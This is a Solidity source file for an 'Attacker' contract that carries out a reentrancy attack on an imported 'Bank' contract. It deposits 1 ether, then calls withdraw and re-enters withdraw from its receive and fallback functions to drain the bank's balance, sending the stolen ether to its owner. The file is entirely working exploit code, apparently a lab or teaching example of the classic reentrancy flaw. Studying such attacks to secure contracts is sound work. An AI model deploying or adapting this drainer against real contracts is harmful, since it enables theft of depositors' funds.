// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {Bank} from "@/Bank.sol";

interface IAttacker {
    error InvalidBankAddress();
    error TransferFailed(address to, uint256 amount);
    error NotOwner();

    function attack() external payable;
    receive() external payable;
    fallback() external payable;
}

contract Attacker is IAttacker {
    Bank public immutable BANK;
    address public immutable OWNER;

    constructor(address _bank) {
        if (_bank == address(0)) revert InvalidBankAddress();
        BANK = Bank(_bank);
        OWNER = msg.sender;
    }

    function attack() external payable {
        // Step 1: Deposit 1 ether to the bank
        BANK.deposit{value: 1 ether}();

        if (msg.sender != OWNER) revert NotOwner();

        // Step 2: Withdraw 1 ether from the bank
        BANK.withdraw(1 ether);

        // Step 3: Send any remaining stolen funds to the attacker
        (bool success, ) = OWNER.call{value: address(this).balance}("");

        if (!success) revert TransferFailed(OWNER, address(this).balance);

        // At this point, the fallback function will be triggered
    }

    receive() external payable {
        if (address(BANK).balance >= 1 ether) {
            // Re-enter the withdraw function to drain more funds
            BANK.withdraw(1 ether);
        }
    }

    fallback() external payable {
        if (address(BANK).balance >= 1 ether) {
            // Re-enter the withdraw function to drain more funds
            BANK.withdraw(1 ether);
        }
    }
}
